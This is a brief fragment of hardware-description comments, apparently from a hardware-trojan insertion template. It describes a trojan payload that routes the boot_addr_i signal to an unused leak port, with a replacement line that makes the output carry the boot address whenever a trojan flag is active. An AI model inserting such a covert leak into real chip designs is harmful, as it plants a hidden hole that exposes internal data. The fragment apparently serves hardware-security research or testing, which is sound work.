 ...
 * Payload: Route boot_addr_i to leak port
 * 
...
// ============================================================
// Information Leak: Route boot_addr_i to unused output
//
...
//   Replace: assign output_signal = trojan_active ? boot_addr_i : normal_value;